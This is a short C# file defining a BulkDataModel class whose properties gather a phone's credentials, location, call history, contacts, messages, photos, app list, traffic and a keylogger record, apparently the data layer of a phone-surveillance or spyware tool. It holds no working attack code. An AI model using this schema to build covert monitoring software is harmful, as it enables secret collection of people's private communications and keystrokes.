using System;
using System.Collections.Generic;
using System.Text;

namespace DataLayer.Models
{
    public class BulkDataModel
    {
        BulkDataModel()
        {
            BatteryLevel = 0;
        }

        public PhoneAuthenticationModel Authentication { get; set; }
        public LocationModel Location { get; set; }
        public CallHistoryModel CallHistory { get; set; }
        public ContactsModel Contacts { get; set; }
        public MessagesModel Messages { get; set; }
        public TraficModel Trafic { get; set; }
        public ApplicationsModel Applications { get; set; }
        public float BatteryLevel { get; set; }
        public PhotosModel Photos { get; set; }
        public MetadataModel Metadata { get; set; }
        public KeyloggerModel Keylogger { get; set; }
    }
}
